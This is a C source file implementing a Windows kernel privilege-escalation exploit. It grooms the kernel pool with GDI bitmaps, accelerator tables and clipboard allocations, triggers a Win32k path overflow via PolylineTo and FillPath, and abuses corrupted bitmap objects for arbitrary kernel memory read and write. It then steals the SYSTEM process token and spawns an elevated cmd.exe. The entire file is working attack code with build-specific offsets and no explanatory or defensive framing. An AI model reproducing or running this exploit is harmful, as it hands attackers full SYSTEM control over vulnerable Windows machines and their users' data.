#include <Windows.h>
#include <wingdi.h>
#include <stdio.h>
#include <winddi.h>
#include <time.h>
#include <stdlib.h>
#include <Psapi.h>
HANDLE hWorker, hManager;
BYTE* bits;
typedef struct
{
	DWORD UniqueProcessIdOffset;
	DWORD TokenOffset;
} VersionSpecificConfig;
VersionSpecificConfig gConfig = { 0x2e0, 0x348 };
void AllocateClipBoard2(unsigned int size)
{
	BYTE* buffer;
	buffer = (BYTE*)malloc(size);
	memset(buffer, 0x41, size);
	buffer[size - 1] = 0x00;
	const size_t len = size;
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
	memcpy(GlobalLock(hMem), buffer, len);
	GlobalUnlock(hMem);
	SetClipboardData(CF_TEXT, hMem);
}
static HBITMAP bitmaps[5000];
void fungshuei()
{
	HBITMAP bmp;
	for (int k = 0; k < 5000; k++)
	{
		bmp = CreateBitmap(1670, 2, 1, 8, NULL);
		bitmaps[k] = bmp;
	}
	HACCEL hAccel, hAccel2;
	LPACCEL lpAccel; 
	lpAccel = (LPACCEL)malloc(sizeof(ACCEL));
	SecureZeroMemory(lpAccel, sizeof(ACCEL));
	HACCEL* pAccels = (HACCEL*)malloc(sizeof(HACCEL) * 7000);
	HACCEL* pAccels2 = (HACCEL*)malloc(sizeof(HACCEL) * 7000);
	for (INT i = 0; i < 7000; i++)
	{
		hAccel = CreateAcceleratorTableA(lpAccel, 1);
		hAccel2 = CreateAcceleratorTableW(lpAccel, 1);
		pAccels[i] = hAccel;
		pAccels2[i] = hAccel2;
	}
	for (int k = 0; k < 5000; k++)
	{
		DeleteObject(bitmaps[k]);
	}
	for (int k = 0; k < 5000; k++)
	{
		CreateEllipticRgn(0x79, 0x79, 1, 1);
	}
	for (int k = 0; k < 5000; k++)
	{
		bmp = CreateBitmap(0x52, 1, 1, 32, NULL);
		bitmaps[k] = bmp;
	}
	for (int k = 0; k < 1700; k++)
	{
		AllocateClipBoard2(0x30);
	}
	for (int k = 2000; k < 4000; k++)
	{
		DestroyAcceleratorTable(pAccels[k]);
		DestroyAcceleratorTable(pAccels2[k]);
	}
}
void SetAddress(BYTE* address)
{
	for (int i = 0; i < sizeof(address); i++)
	{
		bits[0xdf0 + i] = address[i];
	}
	SetBitmapBits((HBITMAP)hManager, 0x1000, bits);
}
void WriteToAddress(BYTE* data)
{
	SetBitmapBits((HBITMAP)hWorker, sizeof(data), data);
}
LONG ReadFromAddress(ULONG64 src, BYTE* dst, DWORD len)
{
	SetAddress((BYTE*)&src);
	return GetBitmapBits((HBITMAP)hWorker, len, dst);
}
ULONG64 GetNTOsBase()
{
	ULONG64 Bases[0x1000];
	DWORD needed = 0;
	ULONG64 krnlbase = 0;
	if (EnumDeviceDrivers((LPVOID*)&Bases, sizeof(Bases), &needed))
	{
		krnlbase = Bases[0];
	}
	return krnlbase;
}
ULONG64 PsInitialSystemProcess()
{
	// load ntoskrnl.exe

	ULONG64 ntos = (ULONG64)LoadLibrary("ntoskrnl.exe");
	ULONG64 addr = (ULONG64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	FreeLibrary((HMODULE)ntos);
	ULONG64 res = 0;
	ULONG64 ntOsBase = GetNTOsBase();
	if (ntOsBase)
	{
		ReadFromAddress(addr - ntos + ntOsBase, (BYTE*)&res, sizeof(ULONG64));
	}
	return res;
}
ULONG64 PsGetCurrentProcess()
{
	ULONG64 pEPROCESS = PsInitialSystemProcess();
	LIST_ENTRY ActiveProcessLinks;
	ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE*)&ActiveProcessLinks, sizeof(LIST_ENTRY));
	ULONG64 res = 0;
	while (TRUE)
	{
		ULONG64 UniqueProcessId = 0;
		pEPROCESS = (ULONG64)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(ULONG64);
		ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset, (BYTE*)&UniqueProcessId, sizeof(ULONG64));
		if (GetCurrentProcessId() == UniqueProcessId)
		{
			res = pEPROCESS;
			break;
		}
		ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE*)&ActiveProcessLinks, sizeof(LIST_ENTRY));
		if (pEPROCESS == (ULONG64)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(ULONG64))
			break;
	}
	return res;
}

void main(int argc, char* argv[])
{
	HDC hdc = GetDC(NULL);
	HDC hMemDC = CreateCompatibleDC(hdc);
	HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
	HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
	static POINT points[0x3fe01];
	for (int l = 0; l < 0x3FE00; l++)
	{
		points[l].x = 0x5a1f;
		points[l].y = 0x5a1f;
	}
	points[2].y = 20;
	points[0x3FE00].x = 0x4a1f;
	points[0x3FE00].y = 0x6a1f;
	if (!BeginPath(hMemDC))
	{
		fprintf(stderr, "[!] BeginPath() Failed: %x\r\n", GetLastError());
	}
	for (int j = 0; j < 0x156; j++)
	{
		if (j > 0x1F && points[2].y != 0x5a1f)
		{
			points[2].y = 0x5a1f;
		}
		if (!PolylineTo(hMemDC, points, 0x3FE01))
		{
			fprintf(stderr, "[!] PolylineTo() Failed: %x\r\n", GetLastError());
		}
	}
	EndPath(hMemDC);
	fungshuei();
	fprintf(stdout, "[+] Trigerring Exploit.\r\n");
	if (!FillPath(hMemDC))
	{
		fprintf(stderr, "[!] FillPath() Failed: %x\r\n", GetLastError());
	}
	printf("%s\r\n", "Done filling.");
	HRESULT res;
	VOID* fake = VirtualAlloc((LPVOID)0x0000000100000000, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!fake)
	{
		fprintf(stderr, "VirtualAllocFailed. %x\r\n", GetLastError());
	}
	memset(fake, 0x1, 0x100);
	bits = (BYTE*)malloc(0x1000);
	memset(bits, 0x42, 0x1000);
	for (int k = 0; k < 5000; k++)
	{
		res = GetBitmapBits(bitmaps[k], 0x1000, bits);
		if (res > 0x150)
		{
			fprintf(stdout, "GetBitmapBits Result. %x\r\nindex: %d\r\n", res, k);
			hManager = bitmaps[k];
			hWorker = bitmaps[k + 1];
			static BYTE Gh04[0x9];
			fprintf(stdout, "\r\nGh04 header:\r\n");
			for (int i = 0; i < 0x10; i++)
			{
				Gh04[i] = bits[0x1d0 + i];
				fprintf(stdout, "%02x", bits[0x1d0 + i]);
			}
			static BYTE Gh05[0x9];
			fprintf(stdout, "\r\nGh05 header:\r\n");
			for (int i = 0; i < 0x10; i++)
			{
				Gh05[i] = bits[0xd90 + i];
				fprintf(stdout, "%02x", bits[0xd90 + i]);
			}
			static BYTE addr1[0x7];
			fprintf(stdout, "\r\nPrevious page Gh04 (Leaked address):\r\n");
			for (int j = 0; j < 0x8; j++)
			{
				addr1[j] = bits[0x210 + j];
				fprintf(stdout, "%02x", bits[0x210 + j]);
			}
			static BYTE* pvscan[0x07];
			fprintf(stdout, "\r\nPvsca0:\r\n");
			for (int i = 0; i < 0x8; i++)
			{
				pvscan[i] = (BYTE*)bits[0xdf0 + i];
				fprintf(stdout, "%02x", bits[0xdf0 + i]);
			}
			addr1[0x0] = 0;
			int u = addr1[0x1];
			u = u - 0x10;
			addr1[1] = u;
			SetAddress(addr1);
			WriteToAddress(Gh04);
			addr1[0] = 0xc0;
			int y = addr1[1];
			y = y + 0xb;
			addr1[1] = y;
			SetAddress(addr1);
			WriteToAddress(Gh05);
			ULONG64 SystemEPROCESS = PsInitialSystemProcess();
			ULONG64 CurrentEPROCESS = PsGetCurrentProcess();
			ULONG64 SystemToken = 0;
			ReadFromAddress(SystemEPROCESS + gConfig.TokenOffset, (BYTE*)&SystemToken, 0x8);
			ULONG64 CurProccessAddr = CurrentEPROCESS + gConfig.TokenOffset;
			SetAddress((BYTE*)&CurProccessAddr);
			WriteToAddress((BYTE*)&SystemToken);
			system("cmd.exe");
			break;
		}
		if (res == 0)
		{
			fprintf(stderr, "GetBitmapBits failed. %x\r\n", GetLastError());
		}
	}
	getchar();
	DeleteObject(bitobj);
	DeleteObject(bitmap);
	DeleteDC(hMemDC);
	ReleaseDC(NULL, hdc);
	VirtualFree((LPVOID)0x0000000100000000, 0x100, MEM_RELEASE);
}